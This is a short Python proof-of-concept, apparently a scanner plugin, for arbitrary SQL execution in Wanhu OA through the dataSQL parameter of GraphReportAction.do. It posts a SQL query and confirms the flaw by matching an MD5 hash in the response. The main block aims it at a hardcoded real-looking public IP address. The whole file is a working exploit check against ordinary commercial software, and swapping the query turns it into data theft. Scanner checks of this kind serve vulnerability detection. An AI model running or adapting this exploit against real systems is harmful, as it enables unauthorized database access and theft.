#!/usr/bin/env python
# coding: UTF-8

"""
POC Name  :  万户oa任意sql语句执行
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2010-064324



"""

import re

def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    url=arg+'defaultroot/GraphReportAction.do?action=showResult'
    data = "dataSQL=select sys.fn_varbintohexstr(hashbytes('MD5','1234'))"
    code,head,res,errcode,finalurl=curl.curl2(url, data)
    if code==200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole('find post sql injection: ' + url+' 任意sql执行')

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://218.104.147.71:7001/')[1])